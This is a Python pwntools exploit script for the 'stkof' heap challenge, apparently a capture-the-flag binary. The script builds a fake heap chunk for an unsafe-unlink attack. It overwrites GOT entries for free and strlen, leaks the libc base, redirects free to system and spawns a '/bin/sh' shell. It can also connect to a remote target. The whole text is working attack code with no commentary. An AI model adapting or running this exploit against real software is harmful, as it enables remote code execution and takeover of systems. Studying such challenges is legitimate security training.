#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('stkof_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x400B7A
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def allocate(size):
    io.sendline(b"1")
    io.sendline(str(size).encode())
    io.recvuntil(b"OK")

def edit(idx, size, data):
    io.sendline(b"2")
    io.sendline(str(idx).encode())
    io.sendline(str(size).encode())
    io.send(data)
    io.recvuntil(b"OK")

def delete(idx):
    io.sendline(b"3")
    io.sendline(str(idx).encode())
    io.recvuntil(b"OK")

def show(idx):
    io.sendline(b"4")
    io.sendline(str(idx).encode())
    io.recvline()
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))


def solve():

    allocate(0x10)
    allocate(0x80)
    allocate(0x80)

    edit(1, 0x10, b"A"*0x10)

    ptrs = 0x602150
    fd = ptrs - 0x18
    bk = ptrs - 0x10
    prev_size = 0x80
    size = 0x90
    chunk  = p64(0x0) + p64(0x80)
    chunk += p64(fd) + p64(bk)
    chunk += p64(0) * 12
    chunk += p64(prev_size) + p64(size)
    
    edit(2, len(chunk), chunk)
    delete(3)

    fake = flat(
        [
            b"A"*0x8,
            exe.got["free"],
            exe.got["strlen"],
            ptrs + 0x8,
            b"/bin/sh\x00"
        ]
    )

    edit(2, len(fake), fake)
    edit(1, 8, p64(exe.plt["puts"]))
    free = show(0)
    libc.address = free - libc.sym["free"]
    info("libc base: %#x", libc.address)

    edit(0, 8, p64(libc.sym["system"]))
    delete(2)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

